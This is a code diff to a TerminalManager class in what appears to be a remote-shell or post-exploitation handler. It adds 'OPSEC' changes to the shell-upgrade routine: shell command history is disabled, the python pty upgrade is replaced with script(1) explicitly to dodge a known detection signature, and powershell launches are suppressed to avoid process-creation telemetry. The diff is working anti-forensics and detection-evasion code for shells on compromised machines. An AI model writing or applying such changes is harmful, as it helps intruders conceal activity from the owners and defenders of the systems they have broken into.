@@ -47,11 +47,22 @@ class TerminalManager:
 
     def unix_pty_upgrade_cmd(self):
         rows, cols = self.rows, self.cols
+        # OPSEC:
+        #   - Suppress shell history unconditionally before spawning a
+        #     subshell so nothing from this session lands in ~/.bash_history.
+        #   - Prefer `script(1)` (a legitimate sysadmin utility) over
+        #     `python -c 'import pty; pty.spawn(...)'`, which is a
+        #     well-known detection signature.
+        #   - Commands are space-prefixed where HISTCONTROL=ignorespace is
+        #     honored, so the leading space itself is another layer.
         return (
+            f"unset HISTFILE; export HISTFILE=/dev/null; "
+            f"export HISTSIZE=0; export HISTFILESIZE=0; "
+            f"export HISTCONTROL=ignorespace; "
+            f"set +o history 2>/dev/null; "
             f"export TERM=xterm-256color; "
-            f"stty rows {rows} cols {cols} 2>/dev/null; "
-            f"python3 -c 'import pty; pty.spawn(\"/bin/bash\")' "
-            f"|| python -c 'import pty; pty.spawn(\"/bin/sh\")' "
+            f" stty rows {rows} cols {cols} 2>/dev/null; "
+            f" script -qfc /bin/bash /dev/null "
             f"|| script -q /dev/null /bin/bash "
             f"|| /bin/bash -i "
             f"|| /bin/sh -i"
@@ -62,13 +73,17 @@ class TerminalManager:
         cols = cols or self.cols
         self.rows, self.cols = rows, cols
         if self.shell_type == 'unix':
-            cmd = f"stty rows {rows} cols {cols} 2>/dev/null; export LINES={rows} COLUMNS={cols}"
+            # OPSEC: leading space so HISTCONTROL=ignorespace does not log it.
+            cmd = (
+                f" stty rows {rows} cols {cols} 2>/dev/null; "
+                f"export LINES={rows} COLUMNS={cols}"
+            )
             return self.send_fn(cmd)
         if self.shell_type == 'windows':
-            ps = (
-                f"$Host.UI.RawUI.WindowSize=New-Object System.Management.Automation.Host.Size({cols},{rows})"
-            )
-            return self.send_fn(f"powershell -NoProfile -Command \"{ps}\"")
+            # OPSEC: do not spawn powershell.exe on every SIGWINCH event.
+            # The process-creation telemetry cost outweighs the cosmetic
+            # benefit of matching the local terminal size.
+            return False
         return False
 
     def send_interrupt(self):
